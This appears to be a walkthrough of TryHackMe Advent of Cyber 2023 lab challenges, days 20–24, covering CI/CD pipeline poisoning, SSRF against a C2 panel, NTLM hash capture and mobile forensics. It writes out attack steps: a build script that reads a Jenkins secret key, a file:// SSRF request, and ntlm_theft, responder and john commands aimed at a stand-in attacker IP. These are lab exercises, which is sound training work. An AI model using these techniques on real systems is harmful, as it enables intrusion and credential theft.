## Day 20 - Advent of Frostlings

During the merger process, someone has tampered with the source control system and odd things are happening. It appears that someone has gained access to AntarctiCraft's CI/CD pipeline and modified the configuration files.

We can access the GitLab server with credentials `DelfSecOps:TryHackMe!` and open **AoC DevSecOps / Advent-Calendar-BFC** to view the repository. It comprises a `public/` directory, a `.gitlab-ci.yml` which defines the operation of the CI/CD pipeline:

![Advent of Cyber 2023 Day 20 - Repository](tryhackme/images/aoc2023d20_repo.png)

Looking specifically at the `.gitlab-ci.yml`, we can see the CI/CD configuration:

![Advent of Cyber 2023 Day 20 - .gitlab-ci.yml](tryhackme/images/aoc2023d20_gitlab_ci.png)

To summarise:

- `workflow`: describes the CI/CD workflow using the commit branch value
- `install_dependencies`: install dependencies and echo a message
- `before_script`: check for an existing docker container, stop it, and remove it to prevent clashes with previous containers
- `test`: run a docker container named `affectionate_saha` on `httpd:latest` images, bind a volume from the local directory to the container's web server directory and map port 9081 on the host to 80 on the container
- `artifacts`: choose `public/` directory
- `rules`: only runs if triggered on the main branch

Detective Frost-eau notes that the Advent Calendar has been stuck in testing for a prolonged period so we must investigate what is happening.

We can start by looking at the merge requests/attempts and see one was opened and merged two weeks ago by Frostlino (@BadSecOps):

![Advent of Cyber 2023 Day 20 - Merge Request](tryhackme/images/aoc2023d20_merge_request.png)

Looking closely at the activity, some code was altered and Delf Lead approved the changes. Looking at **CI/CD -> Jobs**, we can view the jobs being executed. It seems that the testing environment has been affecting the website in the production environment.

We can confirm this by going to the website on `MACHINE IP:9081` and see it is defaced with a **Frostlings Rule** message.

![Advent of Cyber 2023 Day 20 - Defaced Website](tryhackme/images/aoc2023d20_defaced_website.png)

Pivoting to the last pipeline that was ran, we see some potentially suspicious behaviour:

![Advent of Cyber 2023 Day 20 - Last Pipeline](tryhackme/images/aoc2023d20_last_pipeline.png)

- User information being printed with `whoami` and `pwd`
- Detailed directory contents being printed with `ls -la` and `ls -la ./public/`
- `echo` is used to generate the HTML containing the defaced Advent Calendar
- Docker deploys a containerised Apache web server (`httpd:latest`)

We can therefore confirm that Frostlino has used the pipeline to deface the Advent Calendar website. 

Looking at the previous commits, we see multiple commits from Frostlino which make edits to the malicious code. It seems that the original code to the Advent Calendar site lies at `986b7407`.

Navigating to this commit, we can take the code within `.gitlab-ci.yml` and copy its contents to the current `main` branch and click **commit**:

![Advent of Cyber 2023 Day 20 - Edit Config](tryhackme/images/aoc2023d20_edit_config.png)

## Day 21 - Yule be Poisoned: A Pipeline of Insecure Code!

After securing the automation, the team discovered other parts of the build system which have been tampered with.

For our poisoned pipeline in the previous task, the attacker had direct access to the repository pipeline. However, if they don't have this level of access, they may have write access to other repositories that could **indirectly** modify the pipeline's execution.

For this to be exploited, the attacker would need to identify a file or other parameter which the pipeline uses. Common examples of this include makefiles or other build files as they are often writable and can run arbitrary commands.

Navigating to the Gitea platform, logging in as `guest:password123`, we are given two repositories:

- `McHoneyBell/gift-wrapper-pipeline`
- `McHoneyBell/gift-wrapper`

Within the first repository, there exists a Jenkinsfile which is writable, meaning an attacker can execute commands on the build system.

We can clone this repository, as follows, and change line 13 from `sh 'make || true'` to `sh 'whoami'` and commit our changes:


```console
$ git clone http://<GITEA_IP>:3000/McHoneyBell/gift-wrapper-pipeline.git
```

```
pipeline {
    agent any

    stages {
        stage('Prepare') {
            steps {
                git 'http://127.0.0.1:3000/McHoneyBell/gift-wrapper.git'
            }
        }

        stage('Build') {
            steps {
                sh 'whoami'
            }
        }
    }
}
```

```console
$ git add .
$ git commit -m '<message>'
$ git push
```

However, when we attempt to push with our `guest` user credentials, we see that `main` is protected. Unfortunately, we cannot create a new branch as this is write-protected too.

![Advent of Cyber 2023 Day 20 - Write Protected](tryhackme/images/aoc2023d20_write_protected.png)

Looking back at the Jenkinsfile, we see that it uses `make` which can be used to define a set of rules to execute steps, such as commands. The makefile is defined within the `gift-wrapper` repo which means it may have different protections than the pipeline repository, allowing an attacker to add malicious commands to it.

```console
$ git clone http://<GITEA_IP>:3000/McHoneyBell/gift-wrapper.git
```

From the Makefile, we can see it executes commands within a `to_pip.sh` script which we can modify to contain our commands:

```
build:
	./to_pip.sh
```

```bash
#!/bin/bash

mkdir -p tests
rm -rf dist/

whoami
uname -r

cat /var/lib/jenkins/secret.key

# python3 setup.py sdist bdist_wheel

# for testing
#cat ~/.home/.pypirc_test
#twine upload --repository testpypi dist/*

# for production
# twine upload dist/*
```

Attempting to push the changes, we see that our commit is successful. We can then run this build within Jenkins and retrieve the information we need for the challenge:

![Advent of Cyber 2023 Day 21 - Build Flag](tryhackme/images/aoc2023d21_build_flag.png)

## Day 22 - Jingle Your SSRF Bells: A Merry Command & Control Hackventure

As the team works to recover the compromised servers, McSkidy's SOC identify a suspicious amount of data being sent to an unknown server, `http://mcgreedysecretc2.thm`. They hypothesize that an insider has likely created a malicious backdoor to exfiltrate this data, so they have contacted law enforcement officer Detective Frost-eau for assistance.

In this case, we will look to compromise the C2 server, and we will do this via SSRF.

We first need to identify the vulnerable input which can be manipulated to trigger the server-side requests. This can be a URL parameter in a web form, an API endpoint, or request parameter such as the referrer.

Visiting the C2 domain, we see that it is protected with a login form. 

![Advent of Cyber 2023 Day 22 - Login Form](tryhackme/images/aoc2023d22_login_form.png)

The C2 can also be accessed via an API. The `Accessing through API` redirects us to the API endpoint where we can craft some SSRF attacks:

![Advent of Cyber 2023 Day 22 - API Endpoint](tryhackme/images/aoc2023d22_api_endpoint.png)

From the documentation, we can see that the `http://10.10.48.88/getClientData.php?url=http://IP_OF_CLIENT/NAME_OF_FILE_YOU_WANT_TO_ACCESS` endpoint takes a URL as a parameter. However, if we change the parameter to access a file on the C2, it will fetch its contents, such as `index.php`:

```
http://10.10.48.88/getClientData.php?url=file:////var/www/html/index.php
```

Changing this to `config.php`, we get the credentials to the panel:

```php
<?php
$username = "mcgreedy";
$password = "mcgreedy!@#$%";

?>
```

![Advent of Cyber 2023 Day 22 - C2 Panel](tryhackme/images/aoc2023d22_c2_panel.png)

From here, we can remove the compromised hosts from the panel:

![Advent of Cyber 2023 Day 22 - Remove Agent](tryhackme/images/aoc2023d22_remove_agent.png)

![Advent of Cyber 2023 Day 22 - Flag](tryhackme/images/aoc2023d22_flag.png)

## Day 23 - Relay All the Way

McSkidy has lost access to their server and it seems McGreedy has changed the password which was confirmed by Log McBlue. However, brute force attempts do not seem to be working. We know that the server has a network file share, so we can attempt an authentication coercion attack.

To accomplish this, we can use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft):

```console
$ python3 ntlm_theft.py -g lnk -s <ATTACKER_IP> -f stealthy
```

The above will create a `lnk` in the `stealthy` directory named `stealthy.lnk`.

Adding the `lnk` to the network share:

```console
$ cd stealthy
$ smbclient //<MACHINE_IP>/ElfShare/ -U guest%
smb: \> put stealthy.lnk
smb: \> dir
```

The above will connect to the share as `guest` and upload the file to the share.

Next, we can run a `responder` listener for incoming authentication attempts:

```console
$ responder -I <INTERFACE>
```

Eventually, will get a captured hash for the `ELFHQSERVER\Administrator` user. Once we received this, we can use `john` along with `greedykeys.txt` from the share to crack the hash:

```console
$ john --wordlist=greedykeys.txt hash.txt
```

This reveals the password as `GreedyGrabber1@`, allowing us to get the flag when we authenticate via RDP:

![Advent of Cyber 2023 Day 23 - Flag](tryhackme/images/aoc2023d23_flag.png)

## Day 24 - You Are on the Naughty List, McGreedy

There is now strong evidence that Tracy McGreedy is the main suspect behind this activity. As such, their company mobile has been seized for analysis by Forensic McBlue.

Using the captured image, we can being to analyse the contents of the device.

We see an image was captured of a board containing a flag:

![Advent of Cyber 2023 Day 24 - Image Flag](tryhackme/images/aoc2023d24_image_flag.png)

Interestingly, we also see McGreedy has saved Detective Frost-eau as "Detective Carrot-Nose" on the device:

![Advent of Cyber 2023 Day 24 - Carrot-Nose](tryhackme/images/aoc2023d24_carrot_nose.png)

Finally, we see a password was shared to Van Sprinkles via SMS:

![Advent of Cyber 2023 Day 24 - SMS Password](tryhackme/images/aoc2023d24_sms_password.png)